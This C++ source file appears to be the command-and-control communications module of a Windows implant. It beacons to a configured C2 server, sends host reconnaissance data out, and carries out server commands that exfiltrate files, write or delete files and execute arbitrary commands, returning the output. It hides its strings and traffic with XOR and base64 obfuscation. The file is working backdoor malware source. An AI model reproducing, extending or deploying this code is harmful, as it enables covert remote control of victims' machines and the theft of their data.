#include "comms.hpp"



// namespace for all communication related classes, methods, etc.
namespace Communication {

    // namesocace for TCP related communication
    namespace TCP {

        // Beacon sleep timer
        int beaconSleepTime = 5000; // 5 seconds by default; 60 seconds when session is no established

        void Packet::SetPacketData(std::string data)
        {
            if (data.length() <= 0)
            {
                data = "{}";
            }
            std::vector<char> vectorized(data.begin(), data.end());
            this->packetData = vectorized;
        }

        void Packet::AddPacketField(std::string field, std::string value)
        {
            std::vector<char> vectorData = this->packetData;
            std::string pktString(vectorData.begin(), vectorData.end());
            nlohmann::json pktData;

            if (!nlohmann::json::accept(pktString))
            {
                pktData = nlohmann::json::parse(R"({})");
            }
            else
            {
                pktData = nlohmann::json::parse(pktString);
            }
            
            pktData[field] = value;

            this->SetPacketData(pktData.dump());
        }

        std::string Packet::GetPacketString()
        {
            std::vector<char> vectorData = this->packetData;
            std::string pktString(vectorData.begin(), vectorData.end());

            return pktString;
        }

        nlohmann::json Packet::GetPacketData()
        {
            std::vector<char> vectorData = this->packetData;
            std::string pktString(vectorData.begin(), vectorData.end());
            if (!nlohmann::json::accept(pktString))
            {
                common::LogWarning(XOR_LIT("JSON parsing error or empty packet: ") + pktString);
                nlohmann::json pktData = nlohmann::json::parse(R"({})");
                return pktData;
            }
            nlohmann::json pktData = nlohmann::json::parse(pktString);
            return pktData;
        }

        void Packet::DecryptPacketData()
        {
            std::string decode = base64_decode_string(this->GetPacketString());
            std::string str = Utilities::XorStringData(decode);
            this->SetPacketData(str);
            this->packetEncrypted = false;
        }

        void Packet::EncryptPacketData()
        {
            if (!this->packetEncrypted) {
                std::string xorData = Utilities::XorStringData(this->GetPacketString());
                std::string encode = base64_encode_string(xorData);
                this->SetPacketData(encode);
                this->packetEncrypted = true;
            }

        }

        int Packet::SendPacket() {
            WSADATA wsaData;
            SOCKET ConnectSocket = INVALID_SOCKET;
            struct addrinfo* result = NULL,
                * ptr = NULL,
                hints;

            const char* sendbuf;
            if (Settings::ENCRYPT_COMMS)
                this->EncryptPacketData();
            sendbuf = this->packetData.data();


            char recvbuf[DEFAULT_BUFLEN];
            int iResult;
            int recvbuflen = DEFAULT_BUFLEN;


            // Initialize Winsock
            iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
            if (iResult != 0) {
                common::LogError(XOR_LIT("WSAStartup failed with error: ") + iResult);
                return 1;
            }

            ZeroMemory(&hints, sizeof(hints));
            hints.ai_family = AF_UNSPEC;
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_protocol = IPPROTO_TCP;

            // Resolve the server address and port
            iResult = getaddrinfo(Settings::C2_IP_ADDRESS.c_str(), Settings::C2_PORT.c_str(), &hints, &result);
            if (iResult != 0) {
                common::LogError(XOR_LIT("getaddrinfo failed with error: ") + iResult);
                WSACleanup();
                return 1;
            }

            for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
                ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
                if (ConnectSocket == INVALID_SOCKET) {
                    common::LogError(XOR_LIT("socket failed with error: (") + std::to_string(WSAGetLastError()));
                    continue;
                }

                iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
                if (iResult == SOCKET_ERROR) {
                    closesocket(ConnectSocket);
                    ConnectSocket = INVALID_SOCKET;
                    continue;
                }
                break;

            }

            freeaddrinfo(result);

            if (ConnectSocket == INVALID_SOCKET) {
                common::LogError(XOR_LIT("Unable to connect to server!"));
                WSACleanup();
                return 1;
            }

            // Send an initial buffer
            iResult = send(ConnectSocket, sendbuf, this->packetData.size(), 0);
            if (iResult == SOCKET_ERROR) {
                common::LogError(XOR_LIT("send failed with error: ") + std::to_string(WSAGetLastError()));
                closesocket(ConnectSocket);
                WSACleanup();
                return 1;
            }

            // shutdown the connection since no more data will be sent
            iResult = shutdown(ConnectSocket, SD_SEND);
            if (iResult == SOCKET_ERROR) {
                common::LogError(XOR_LIT("shutdown failed with error: ") + std::to_string(WSAGetLastError()));
                closesocket(ConnectSocket);
                WSACleanup();
                return 1;
            }

            // Receive until the peer closes the connection
            std::vector<char> dataVec;
            do {
                iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
                if (iResult > 0) {
                    dataVec.insert(dataVec.end(), recvbuf, recvbuf + iResult);
                }
                else if (iResult == 0) {
                    common::LogError(XOR_LIT("Connection closed"));
                }
                else {
                    common::LogError(XOR_LIT("recv failed with error: ") + std::to_string(WSAGetLastError()));
                }

            } while (iResult > 0);

            std::string s(dataVec.begin(), dataVec.end());

            // cleanup
            closesocket(ConnectSocket);
            WSACleanup();

            Communication::TCP::Packet responsePacket;
            responsePacket.SetPacketData(s);

            Communication::HandleC2Response(responsePacket);

            return 0;
        }
    }

    int HandleC2Response(Communication::TCP::Packet Packet)
    {
        // cmd response initials
        Communication::TCP::Packet pktResponse;
        std::string output_data;

        if (Settings::ENCRYPT_COMMS)
            Packet.DecryptPacketData();
        common::LogInfo(XOR_LIT("Incoming C2 Packet: ") + Packet.GetPacketString());

        nlohmann::json packetData = Packet.GetPacketData();

        // make sure the header is valid
        if (packetData[XOR_LIT("header")] != Settings::HEADER)
            return 1;

        if (!packetData.contains(XOR_LIT("command")))
            return 1;

        std::string command = packetData[XOR_LIT("command")];

        switch (atoi(command.c_str())) {
        case COMMAND_READ:
            // check we have correct data
            if (!packetData.contains(XOR_LIT("filePath")))
                return 1;

            // upload file
            output_data = Commands::cmdUploadFile(packetData[XOR_LIT("filePath")]);
            pktResponse.AddPacketField(XOR_LIT("header"), Settings::HEADER);
            pktResponse.AddPacketField(XOR_LIT("command"), std::format("{}",COMMAND_READ));
            pktResponse.AddPacketField(XOR_LIT("fileName"), Utilities::GetFileNameFromPath(packetData[XOR_LIT("filePath")]));
            pktResponse.AddPacketField(XOR_LIT("fileContents"), output_data);
            pktResponse.SendPacket();


            return 0;

        case COMMAND_WRITE:
            // check we have correct data
            if (!packetData.contains(XOR_LIT("filePath")) || !packetData.contains(XOR_LIT("fileContents")))
                return 1;

            // Write a file
            Commands::cmdCreateFile(packetData[XOR_LIT("filePath")], packetData[XOR_LIT("fileContents")]);
            return 0;

        case COMMAND_DELETE:
            // check we have correct data
            if (!packetData.contains(XOR_LIT("filePath")))
                return 1;

            // Delete a file
            Commands::cmdDeleteFile(packetData[XOR_LIT("filePath")]);
            return 0;
        
        case COMMAND_EXECUTE:
            // check we have correct data
            if (!packetData.contains(XOR_LIT("execute")))
                return 1;

            // Execute a command
            output_data = Commands::cmdExecuteCommand(packetData[XOR_LIT("execute")]);
            pktResponse.AddPacketField(XOR_LIT("header"), Settings::HEADER);
            pktResponse.AddPacketField(XOR_LIT("command"), std::format("{}", COMMAND_EXECUTE));
            pktResponse.AddPacketField(XOR_LIT("response"), base64_encode_string(output_data));
            pktResponse.SendPacket();
            return 0;

        case COMMAND_GTEST:
            // For unit testing
            return 0;
        }

        return 1;
    }

    void InitCommunicationLoop()
    {
        // initial session establishment
        Communication::TCP::Packet pktInitialize;
        pktInitialize.AddPacketField(XOR_LIT("header"), Settings::HEADER);

        common::LogInfo(XOR_LIT("Sending C2 initial packet: ") + pktInitialize.GetPacketString());

        while (pktInitialize.SendPacket() != 0) {
            common::LogInfo(XOR_LIT("Looping initialize"));
            std::this_thread::sleep_for(std::chrono::milliseconds(TCP::beaconSleepTime));
        }
        common::LogInfo(XOR_LIT("C2 session initialized"));

        common::LogInfo(XOR_LIT("Running recon tasks"));
        std::string reconData = Recon::InitRecon();

        common::LogInfo(XOR_LIT("Preparing recon packet"));
        Communication::TCP::Packet pktRecon;
        pktRecon.SetPacketData(reconData);
        pktRecon.AddPacketField(XOR_LIT("header"), Settings::HEADER);
        pktRecon.AddPacketField(XOR_LIT("command"), std::format("{}", INIT_RECON));

        common::LogInfo(XOR_LIT("Sending recon packet: ") + pktRecon.GetPacketString());
        pktRecon.SendPacket();

        common::LogInfo(XOR_LIT("Entering communication loop"));

        while (true) {
            Communication::TCP::Packet pktBeacon;
            pktBeacon.AddPacketField(XOR_LIT("header"), Settings::HEADER);
            pktBeacon.SendPacket();

            std::this_thread::sleep_for(std::chrono::milliseconds(Communication::TCP::beaconSleepTime));
        }
    }
}